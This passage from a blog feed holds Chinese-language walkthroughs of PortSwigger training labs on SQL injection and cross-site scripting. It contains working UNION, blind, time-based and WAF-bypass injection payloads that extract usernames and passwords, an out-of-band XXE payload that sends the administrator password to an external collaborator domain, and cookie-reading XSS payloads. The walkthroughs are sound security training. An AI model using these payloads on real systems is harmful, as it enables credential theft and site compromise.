alt="image-20231122180456716"></p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs — SQL Injection</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8ASQL%20Injection/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8ASQL%20Injection/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs-—-SQL-Injection"><a href="#Portswigger-Labs-—-SQL-Injection" class="headerlink" title="Portswigger Labs — SQL Injection"></a>Portswigger Labs — SQL Injection</h1><h2 id="通过sql注入查看隐藏数据"><a href="#通过sql注入查看隐藏数据" class="headerlink" title="通过sql注入查看隐藏数据"></a>通过sql注入查看隐藏数据</h2><p>正常页面如下：</p><p><img src="/2023/04/27/file-upload/240202134654249.png" alt="image-20240202134654249"></p><p>提示在category处存在sql注入，直接用’闭合，加上永真句：</p><p><img src="/2023/04/27/file-upload/240202134738073.png" alt="image-20240202134738073"></p><p>过关。</p><h2 id="通过sql注入绕过登录"><a href="#通过sql注入绕过登录" class="headerlink" title="通过sql注入绕过登录"></a>通过sql注入绕过登录</h2><p><img src="/2023/04/27/file-upload/240202135026332.png" alt="image-20240202135026332"></p><p>这里是利用sql注入绕过登录，还是同样利用’闭合加永真：<code>administrator&#39; or 1=1--</code></p><h2 id="查询Oracle数据库的类型和版本"><a href="#查询Oracle数据库的类型和版本" class="headerlink" title="查询Oracle数据库的类型和版本"></a>查询Oracle数据库的类型和版本</h2><p>这里要求查出oracle的数据库类型和版本。</p><p><img src="/2023/04/27/file-upload/240202141229011.png" alt="image-20240202141229011"></p><p>明显是字符型的注入，判断一下是否存在：</p><p><img src="/2023/04/27/file-upload/240202141321421.png" alt="image-20240202141321421"></p><p>存在注入，下面判断一下列数：</p><p><img src="/2023/04/27/file-upload/240202141354139-17068544344681.png" alt="image-20240202141354139"></p><p>2正常，3报错，因此有2列。</p><p>在oracle数据库中，select语句一定要跟from+tablename，一般利用内置的dual表。</p><p><img src="/2023/04/27/file-upload/240202141657303.png" alt="image-20240202141657303"></p><p>成功回显。（注意这里如果是数字型的1,2会失败）</p><p>修改一下payload:</p><p><code>SELECT banner FROM v$version</code></p><p><code>&#39; union select banner,&#39;1&#39; FROM v$version--</code></p><p><img src="/2023/04/27/file-upload/240202142137450.png" alt="image-20240202142137450"></p><h2 id="查询MySQL和Microsoft数据库的类型和版本"><a href="#查询MySQL和Microsoft数据库的类型和版本" class="headerlink" title="查询MySQL和Microsoft数据库的类型和版本"></a>查询MySQL和Microsoft数据库的类型和版本</h2><p>这一关的数据库为mysql和microsoft。</p><p><img src="/2023/04/27/file-upload/240202145601216.png" alt="image-20240202145601216"></p><p>and 1&#x3D;1正常，and 1&#x3D;2为空，说明存在注入。</p><p>这里–被过滤，因此使用#注释符。</p><p>order by 3时报错，说明有两列：</p><p><img src="/2023/04/27/file-upload/240202145727011.png" alt="image-20240202145727011"></p><p>修改一下payload即可：</p><p><code>SELECT @@version</code></p><p><code>%27union+select+@@version,44444#</code></p><p><img src="/2023/04/27/file-upload/240202145945436.png" alt="image-20240202145945436"></p><h2 id="查询非Oracle数据库的数据库内容"><a href="#查询非Oracle数据库的数据库内容" class="headerlink" title="查询非Oracle数据库的数据库内容"></a>查询非Oracle数据库的数据库内容</h2><p>这一关要求列出数据库的数据，并以administrator用户登录。</p><p>前面的步骤都相同，包括判断注入，判断注入类型，确定列数等等。</p><p>通过<code>select table_name from information_schema.tables</code>来查表：</p><p><img src="/2023/04/27/file-upload/240202151403065.png" alt="image-20240202151403065"></p><p>拿到table_name，查columns：<code>https://0a4c002603ab1c37825fdd03000f0060.web-security-academy.net/filter?category=Tech+gifts%27+union+select+column_name,%272222%27+from+information_schema.columns+where+table_name=%27users_rwizzl%27--</code></p><p><img src="/2023/04/27/file-upload/240202152001237.png" alt="image-20240202152001237"></p><p>进一步查账号密码：<code>https://0a4c002603ab1c37825fdd03000f0060.web-security-academy.net/filter?category=Tech+gifts%27+union+select+username_vngpnl,password_jtbpmq+from+users_rwizzl--</code></p><p><img src="/2023/04/27/file-upload/240202152117018.png" alt="image-20240202152117018"></p><p>用账号密码登录即可。</p><h2 id="查询Oracle数据库的数据库内容"><a href="#查询Oracle数据库的数据库内容" class="headerlink" title="查询Oracle数据库的数据库内容"></a>查询Oracle数据库的数据库内容</h2><p>跟前面的区别在于数据库不同。</p><p>更改语句即可：</p><p><code>https://0abb00a103fd70f78018e42b009e009f.web-security-academy.net/filter?category=Food+%26+Drink%27+union+select+column_name,%2711111%27+from+all_tab_columns+where+table_name=%27USERS_CHXAON%27--</code></p><p><img src="/2023/04/27/file-upload/240202152835347.png" alt="image-20240202152835347"></p><p><code>https://0abb00a103fd70f78018e42b009e009f.web-security-academy.net/filter?category=Food+%26+Drink%27+union+select+USERNAME_PEOYRV,PASSWORD_AUFDLF+from+USERS_CHXAON--</code></p><p><img src="/2023/04/27/file-upload/240202152926524.png" alt="image-20240202152926524"></p><h2 id="通过union判断列数"><a href="#通过union判断列数" class="headerlink" title="通过union判断列数"></a>通过union判断列数</h2><p><img src="/2023/04/27/file-upload/240202153746903.png" alt="image-20240202153746903"></p><p>这一关和前面的方法相同，通过order by判断出有3列，再根据要求利用payload<code>union select null,null,null --</code>即可。</p><h2 id="通过union判断数据回显"><a href="#通过union判断数据回显" class="headerlink" title="通过union判断数据回显"></a>通过union判断数据回显</h2><p>这一关跟前一关一样，区别在于要判断出哪一列能回显数据，将提供的随机数成功回显即可。</p><p><img src="/2023/04/27/file-upload/240202154338838.png" alt="image-20240202154338838"></p><h2 id="通过union查找其他表的数据"><a href="#通过union查找其他表的数据" class="headerlink" title="通过union查找其他表的数据"></a>通过union查找其他表的数据</h2><p>已经给出了表名和列名，直接查询即可：</p><p><code>https://0a51001e035b123580aaa3af006a001d.web-security-academy.net/filter?category=Tech+gifts%27+union+select+username,password+from+users--</code></p><p><img src="/2023/04/27/file-upload/240202154703833.png" alt="image-20240202154703833"></p><h2 id="通过union在一列中查询多条数据"><a href="#通过union在一列中查询多条数据" class="headerlink" title="通过union在一列中查询多条数据"></a>通过union在一列中查询多条数据</h2><p>还是两个字段，首先测试一下哪个能回显：</p><p><img src="/2023/04/27/file-upload/240202155259140.png" alt="image-20240202155259140"></p><p>只有第二个位置能回显数据，参考portswigger的checklist，利用||进行拼接：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">String concatenation<br>You can concatenate together multiple strings <span class="hljs-built_in">to</span> make <span class="hljs-keyword">a</span> single <span class="hljs-keyword">string</span>.<br><br>Oracle<span class="hljs-string">&#x27;foo&#x27;</span>||<span class="hljs-string">&#x27;bar&#x27;</span><br>Microsoft<span class="hljs-string">&#x27;foo&#x27;</span>+<span class="hljs-string">&#x27;bar&#x27;</span><br>PostgreSQL<span class="hljs-string">&#x27;foo&#x27;</span>||<span class="hljs-string">&#x27;bar&#x27;</span><br>MySQL<span class="hljs-string">&#x27;foo&#x27;</span> <span class="hljs-string">&#x27;bar&#x27;</span> [Note <span class="hljs-keyword">the</span> <span class="hljs-literal">space</span> between <span class="hljs-keyword">the</span> <span class="hljs-literal">two</span> strings]<br>CONCAT(<span class="hljs-string">&#x27;foo&#x27;</span>,<span class="hljs-string">&#x27;bar&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>https://0a11002403798444804def6800d90040.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+%2711111%27,username||%27~%27||password+from+users--</code></p><p><img src="/2023/04/27/file-upload/240202155729389.png" alt="image-20240202155729389"></p><h2 id="带有条件响应的盲注"><a href="#带有条件响应的盲注" class="headerlink" title="带有条件响应的盲注"></a>带有条件响应的盲注</h2><p>这里是sql盲注，如果查到数据，会回显welcome。</p><p><code>TrackingId=KJrS7xv71YWYlijW&#39;+and+(SELECT+&#39;a&#39;+FROM+users+where+username=&#39;administrator&#39;)=&#39;a&#39;--;</code></p><p>跳过前面的步骤，直接通过and来进行条件判断。上面的请求包回显了welcome，说明存在一个值为administrator的username。</p><p>下面先判断password的长度，大于19为true，大于20为false，因此password长度为20.</p><p><code>TrackingId=KJrS7xv71YWYlijW&#39;+and+(SELECT+SUBSTRING(password,1,1)+from+users+where+username=&#39;administrator&#39;)=&#39;x&#39;--; session=wzRF0fL70pnOpCNYLjcE72wIeMcOfnMh</code></p><p>通过substring一位一位判断，可以利用intruder模块：</p><p><img src="/2023/04/27/file-upload/240202164217966.png" alt="image-20240202164217966"></p><p>直接利用cluster bomb模式，依次爆破即可。</p><p><img src="/2023/04/27/file-upload/240202164510837.png" alt="image-20240202164510837"></p><h2 id="带有条件错误的盲注"><a href="#带有条件错误的盲注" class="headerlink" title="带有条件错误的盲注"></a>带有条件错误的盲注</h2><p>这一关是基于报错的盲注。一个单引号报错，两个正常回显，说明闭合了：</p><p><img src="/2023/04/27/file-upload/240202170322465.png" alt="image-20240202170322465"></p><p>用简单的select语句判断出数据库之后，直接修改payload进行密码长度猜解：</p><p><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></p><p><code>SELECT CASE WHEN (length(password)&gt;1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username=&#39;administrator&#39;</code></p><p>大于19时，报错，大于20时，正常回显，说明length&#x3D;20：</p><p><img src="/2023/04/27/file-upload/240202171654330.png" alt="image-20240202171654330"></p><p>确定长度后，利用SUBSTR函数依次爆破密码即可，与前面类似<code>SUBSTR(password,1,1)=&#39;a&#39;</code>。</p><p><img src="/2023/04/27/file-upload/240202172103335.png" alt="image-20240202172103335"></p><h2 id="基于错误的sql注入"><a href="#基于错误的sql注入" class="headerlink" title="基于错误的sql注入"></a>基于错误的sql注入</h2><p>前面重复的步骤省略，判断出是字符型，并且列为1.</p><p><img src="/2023/04/27/file-upload/240204095958803.png" alt="image-20240204095958803"></p><p>没有报错。</p><p>下面判断是哪个数据库：</p><p><img src="/2023/04/27/file-upload/240204100030375.png" alt="image-20240204100030375"></p><p>通过查看版本来判断，只有执行select version()时不报错，因此数据库为postgresql。</p><p>利用postgresql的条件报错语句：</p><p><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</code></p><p><code>1=CAST((SELECT 1) AS int)--</code></p><p><img src="/2023/04/27/file-upload/240204100955379.png" alt="image-20240204100955379"></p><p>正常回显，说明语句正确。</p><p>下面开始获取账号密码：</p><p><code>TrackingId=p3dGSDL2IyqrWWfg&#39; AND 1=CAST((SELECT username FROM users) AS int)--;</code></p><p><img src="/2023/04/27/file-upload/240204101049100.png" alt="image-20240204101049100"></p><p>报错了，看错误提示sql语句执行到AS就终止了，后续内容被截断，删除trackingid的值试试：</p><p><img src="/2023/04/27/file-upload/240204101144311.png" alt="image-20240204101144311"></p><p>有不止一条数据，报错，加上limit：</p><p><img src="/2023/04/27/file-upload/240204101213797.png" alt="image-20240204101213797"></p><p>得到用户名administrator。同样的方法获取password：</p><p><img src="/2023/04/27/file-upload/240204101309101.png" alt="image-20240204101309101"></p><h2 id="基于延时的sql盲注"><a href="#基于延时的sql盲注" class="headerlink" title="基于延时的sql盲注"></a>基于延时的sql盲注</h2><p>这一关需要sleep 10s，尝试一下各个数据库的sleep语句即可，最终发现是postgresql：</p><p><code>TrackingId=AEtEQxse7lEANiA6&#39; ||pg_sleep(10)--;</code></p><p><img src="/2023/04/27/file-upload/240204102137469.png" alt="image-20240204102137469"></p><h2 id="基于延时和信息检索的sql注入"><a href="#基于延时和信息检索的sql注入" class="headerlink" title="基于延时和信息检索的sql注入"></a>基于延时和信息检索的sql注入</h2><p>这一关要求以administrator登录，同样省去前面重复的步骤，验证一下语句正确性：</p><p>这里%3B是表示开始新的sql语句，成功sleep了10秒：</p><p><img src="/2023/04/27/file-upload/240204103403689.png" alt="image-20240204103403689"></p><p>后续通过爆破不断进行猜解即可。</p><p>判断存在administrator：</p><p><code>&#39;%3BSELECT+CASE+WHEN+(username=&#39;administrator&#39;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code></p><p>判断密码长度：</p><p><code>&#39;%3BSELECT+CASE+WHEN+(username=&#39;administrator&#39;+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code></p><p><img src="/2023/04/27/file-upload/240204105520965.png" alt="image-20240204105520965"></p><p>长度为20.下面同理：</p><p><code>&#39;%3BSELECT+CASE+WHEN+(username=&#39;administrator&#39;+AND+SUBSTRING(password,1,1)=&#39;a&#39;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code></p><p><img src="/2023/04/27/file-upload/240204105950939.png" alt="image-20240204105950939"></p><p>这里响应时候通过response received进行判断。</p><h2 id="带外交互的sql盲注"><a href="#带外交互的sql盲注" class="headerlink" title="带外交互的sql盲注"></a>带外交互的sql盲注</h2><p>这关要带外交互，修改cheat sheet的payload即可：</p><p><code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#39;||(SELECT YOUR-QUERY-HERE)||&#39;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code></p><p><code>&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//5bhloghx4k0x6920ykelrbwa61cs0io7.oastify.com/&quot;&gt;+%25remote%3b]&gt;&#39;),&#39;/l&#39;)+FROM+dual--</code></p><p><img src="/2023/04/27/file-upload/240204113303300.png" alt="image-20240204113303300"></p><h2 id="带外数据泄露的sql盲注"><a href="#带外数据泄露的sql盲注" class="headerlink" title="带外数据泄露的sql盲注"></a>带外数据泄露的sql盲注</h2><p>这里要进一步利用，把数据外带，跟dnslog执行命令的方法类似，利用子域名的方式即可。</p><p>进一步修改payload:</p><p><code>TrackingId=&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//&#39;||(SELECT+password+FROM+users+WHERE+username%3d&#39;administrator&#39;)||&#39;.5bhloghx4k0x6920ykelrbwa61cs0io7.oastify.com/&quot;&gt;+%25remote%3b]&gt;&#39;),&#39;/l&#39;)+FROM+dual--;</code></p><p><img src="/2023/04/27/file-upload/240204113845596.png" alt="image-20240204113845596"></p><h2 id="通过-XML-编码绕过WAF"><a href="#通过-XML-编码绕过WAF" class="headerlink" title="通过 XML 编码绕过WAF"></a>通过 XML 编码绕过WAF</h2><p>这一关有waf，先试一下union select：</p><p><img src="/2023/04/27/file-upload/240204121427065.png" alt="image-20240204121427065"></p><p>被拦截了，这里可以使用插件Hackvertor，进行编码：</p><p><img src="/2023/04/27/file-upload/240204121724661.png" alt="image-20240204121724661"></p><p>不再拦截，如果用两列数据，就出错，说明只有一列：</p><p><img src="/2023/04/27/file-upload/240204121759384.png" alt="image-20240204121759384"></p><p>联合查询，得到账号密码：</p><p><img src="/2023/04/27/file-upload/240204121917761.png" alt="image-20240204121917761"></p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs—Cross Site Scripting</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%94Cross%20Site%20Scripting/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%94Cross%20Site%20Scripting/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs—Cross-Site-Scripting"><a href="#Portswigger-Labs—Cross-Site-Scripting" class="headerlink" title="Portswigger Labs—Cross Site Scripting"></a>Portswigger Labs—Cross Site Scripting</h1><h2 id="Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Lab: Reflected XSS into HTML context with nothing encoded"></a>Lab: Reflected XSS into HTML context with nothing encoded</h2><p>This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.<br>To solve the lab, perform a cross-site scripting attack that calls the <code>alert</code> function.<br>这个 lab 没有任何编码过滤等等，直接输入 payload <code>&lt;script&gt;alert()&lt;/script&gt;</code> 即可弹窗：<br><img src="/2023/04/27/file-upload/240104163634723.png"></p><h2 id="Lab-Stored-XSS-into-HTML-context-with-nothing-encoded"><a href="#Lab-Stored-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Lab: Stored XSS into HTML context with nothing encoded"></a>Lab: Stored XSS into HTML context with nothing encoded</h2><p>This lab contains a stored cross-site scripting vulnerability in the comment functionality.<br>To solve this lab, submit a comment that calls the <code>alert</code> function when the blog post is viewed.<br>同样没有过滤，存储型 xss，直接插入 payload 即可：<br><img src="/2023/04/27/file-upload/240104163918102.png"></p><h2 id="Lab-DOM-XSS-in-document-write-sink-using-source-location-search"><a href="#Lab-DOM-XSS-in-document-write-sink-using-source-location-search" class="headerlink" title="Lab: DOM XSS in document.write sink using source location.search"></a>Lab: DOM XSS in document.write sink using source location.search</h2><p>This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript <code>document.write</code> function, which writes data out to the page. The <code>document.write</code> function is called with data from <code>location.search</code>, which you can control using the website URL.<br>To solve this lab, perform a cross-site scripting attack that calls the <code>alert</code> function.<br>DOM 型 XSS，先输入 aaaaaa，审查元素或者直接 CTRL+F 找到 aaaaaa 的位置：<br><img src="/2023/04/27/file-upload/240104164900732.png"><br><code>&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=aaaaaa&quot;&gt;</code><br>可以通过闭合”来实现 xss，payload 为 <code>1234&quot; onerror=alert()</code>，插入后未弹窗，查看：<br><img src="/2023/04/27/file-upload/240104165630012.png"><br>修改 payload：<br><img src="/2023/04/27/file-upload/240104165701653.png"><br>成功闭合，但是仍然未弹窗，使用 onload：<br><img src="/2023/04/27/file-upload/240104165731634.png"></p><h2 id="Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search"><a href="#Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search" class="headerlink" title="Lab: DOM XSS in innerHTML sink using source location.search"></a>Lab: DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h2><p>This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an <code>innerHTML</code> assignment, which changes the HTML contents of a <code>div</code> element, using data from <code>location.search</code>.<br>To solve this lab, perform a cross-site scripting attack that calls the <code>alert</code> function.<br>尝试前一关的 payload <code>&lt;img src=1 onerror=alert(1)&gt;</code>:<br><img src="/2023/04/27/file-upload/240104170001915.png"></p><h2 id="Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="Lab: DOM XSS in jQuery anchor href attribute sink using location.search source"></a>Lab: DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h2><p>This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library’s <code>$</code> selector function to find an anchor element, and changes its <code>href</code> attribute using data from <code>location.search</code>.<br>To solve this lab, make the “back” link alert <code>document.cookie</code>.<br>这一关的要求是在点击 back 按钮时触发 xss，检查元素：<br><img src="/2023/04/27/file-upload/240104170638098.png"><br>这里是 href 标签，并且参数值是通过 returnPath 传入，尝试 javascript：<br><code>javascript:alert(document.cookie)</code><br><img src="/2023/04/27/file-upload/240104171032151.png"><br>成功触发。</p><h2 id="Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="Lab: DOM XSS in jQuery selector sink using a hashchange event"></a>Lab: DOM XSS in jQuery selector sink using a hashchange event</h2><p>This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery’s <code>$()</code> selector function to auto-scroll to a given post, whose title is passed via the <code>location.hash</code> property.<br>To solve the lab, deliver an exploit to the victim that calls the <code>print()</code> function in their browser.<br>将 payload 填入 body 字段，deliver 即可：<code>&lt;iframe src=&quot;xxx.web-security-academy.net/#&quot; onload=&quot;this.src+=&#39;&lt;img src=x onerror=confirm()&gt;&#39;&quot;&gt;&lt;/iframe&gt; </code></p><h2 id="Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><a href="#Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded" class="headerlink" title="Lab: Reflected XSS into attribute with angle brackets HTML-encoded"></a>Lab: Reflected XSS into attribute with angle brackets HTML-encoded</h2><p>This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the <code>alert</code> function.<br>尝试 aaaaaa，寻找在代码中的位置：<br><img src="/2023/04/27/file-upload/240104174329209.png"><br><code>&lt;input type=&quot;text&quot; placeholder=&quot;Search the blog...&quot; name=&quot;search&quot; value=&quot;aaaaaa&quot;&gt;</code><br>lab 提示尖括号转义，使用不带尖括号的 payload 即可：<br>&#96;&#96;”onmousemove&#x3D;”alert()<br><img src="/2023/04/27/file-upload/240104175240494.png"></p><h2 id="Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><a href="#Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded" class="headerlink" title="Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded"></a>Lab: Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded</h2><p>This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the <code>alert</code> function when the comment author name is clicked.<br>这一关是 href 属性，并且双引号会被编码，javascript 即可：<br><code>javascript:alert()</code><br>点击访问 url 即可触发：<br><img src="/2023/04/27/file-upload/240104180022234.png"></p><h2 id="Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><a href="#Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded" class="headerlink" title="Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded"></a>Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</h2><p>This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the <code>alert</code> function.<br>这一关在 js 中会进行编码，闭合’构造一个新的语句即可：<br><code>&#39;;alert();&#39;</code><br><img src="/2023/04/27/file-upload/240104180809326.png"><br>使用-同样可以，<code>&#39;-alert()-&#39;</code></p><h2 id="Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><a href="#Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element" class="headerlink" title="Lab: DOM XSS in document.write sink using source location.search inside a select element"></a>Lab: DOM XSS in document.write sink using source location.search inside a select element</h2><p>This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript <code>document.write</code> function, which writes data out to the page. The <code>document.write</code> function is called with data from <code>location.search</code> which you can control using the website URL. The data is enclosed within a select element.<br>To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the <code>alert</code> function.</p><p><img src="/2023/04/27/file-upload/240204162707852.png" alt="image-20240204162707852"></p><p>这里checkstock的选项，是通过storeId参数，GET请求时添加上的。</p><p><img src="/2023/04/27/file-upload/240204162844046.png" alt="image-20240204162844046"></p><p>只需要将select闭合即可：</p><p><code>&lt;/select&gt;&lt;iframe src=javascript:alert(111)&gt;&lt;/iframe&gt;</code>：</p><p><img src="/2023/04/27/file-upload/240204162610567.png" alt="image-20240204162610567"></p><h2 id="Lab-DOM-XSS-in-AngularJS-expression-with-angle-brackets-and-double-quotes-HTML-encoded"><a href="#Lab-DOM-XSS-in-AngularJS-expression-with-angle-brackets-and-double-quotes-HTML-encoded" class="headerlink" title="Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded"></a>Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</h2><p>This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.</p><p>AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the <code>ng-app</code> attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.</p><p>To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the <code>alert</code> function.</p><p>输入aaaaaaa，搜索，查找输入内容：</p><p><img src="/2023/04/27/file-upload/240205133210875.png" alt="image-20240205133210875"></p><p>发现其被ng-app包裹，利用AngularJS表达式：<code>&#123;&#123;$on.constructor('alert(1)')()&#125;&#125;</code></p><p><img src="/2023/04/27/file-upload/240205133337460.png" alt="image-20240205133337460"></p><h2 id="Lab-Reflected-DOM-XSS"><a href="#Lab-Reflected-DOM-XSS" class="headerlink" title="Lab: Reflected DOM XSS"></a>Lab: Reflected DOM XSS</h2><p>This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.</p><p>To solve this lab, create an injection that calls the <code>alert()</code> function.</p><p>这一关搜索的内容会以json的形式返回：</p><p><img src="/2023/04/27/file-upload/240205140533303.png" alt="image-20240205140533303"></p><p>并且过滤了双引号。</p><p>在history中可以看到searchResults.js，其中在处理json响应时，用到了eval函数：</p><p><img src="/2023/04/27/file-upload/240205140636712.png" alt="image-20240205140636712"></p><p>最终payload如下：<code>\&quot;-alert(1)&#125;//</code></p><p><img src="/2023/04/27/file-upload/240205140811478.png" alt="image-20240205140811478"></p><p>json响应为：</p><p><img src="/2023/04/27/file-upload/240205140900274.png" alt="image-20240205140900274"></p><p>下面分析一下payload：</p><p>站点本身没有转移<code>\</code>，当 JSON 响应尝试转义<code>&quot;</code>时，会再加上一个反斜，因此双反斜杠会导致转义被抵消，导致语句的闭合。</p><p>然后用运算符来分割语句，进行alert，最后加上<code>//</code>注释，响应生成如下：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&#123;<span class="hljs-string">&quot;searchTerm&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;\\&quot;</span>-alert</span>(<span class="hljs-number">1</span>)&#125;//<span class="hljs-string">&quot;, &quot;</span>results<span class="hljs-string">&quot;:[]&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Lab-Stored-DOM-XSS"><a href="#Lab-Stored-DOM-XSS" class="headerlink" title="Lab: Stored DOM XSS"></a>Lab: Stored DOM XSS</h2><p>This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the <code>alert()</code> function.</p><p>这一关利用JavaScript <code>replace()</code> 函数对尖括号进行编码。但是，当第一个参数是字符串时，该函数仅替换第一次出现的位置。</p><p>payload：<code>&lt;&gt;&lt;iframe src=javascript:alert(111)&gt;&lt;/iframe&gt;</code></p><p><img src="/2023/04/27/file-upload/240205142339567.png" alt="image-20240205142339567"></p><h2 id="Lab-Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked"><a href="#Lab-Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked" class="headerlink" title="Lab: Reflected XSS into HTML context with most tags and attributes blocked"></a>Lab: Reflected XSS into HTML context with most tags and attributes blocked</h2><p>This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.</p><p>To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the <code>print()</code> function.</p><p>这一关有waf过滤，采用的是爆破的方式筛选出可行的tag和event。</p><p>先爆破tag：</p><p><img src="/2023/04/27/file-upload/240205151702352.png" alt="image-20240205151702352"></p><p>body可行，再爆破event：</p><p><code>?search=%3Cbody%20§11§=1%3E</code></p><p><img src="/2023/04/27/file-upload/240205151746886.png" alt="image-20240205151746886"></p><p>再一个一个尝试即可，最终利用onresize成功过关。</p><h2 id="Lab-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones"><a href="#Lab-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones" class="headerlink" title="Lab: Reflected XSS into HTML context with all tags blocked except custom ones"></a>Lab: Reflected XSS into HTML context with all tags blocked except custom ones</h2><p>This lab blocks all HTML tags except custom ones.</p><p>To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts <code>document.cookie</code>.</p><p>这一关只有自定义标签没被过滤，先创建一个 ID 为 x 的自定义标记，其中包含触发 alert 函数的 onfocus 事件处理程序。页面加载后，URL 末尾的哈希就会集中在该元素上，从而导致调用 alert。</p><p>payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 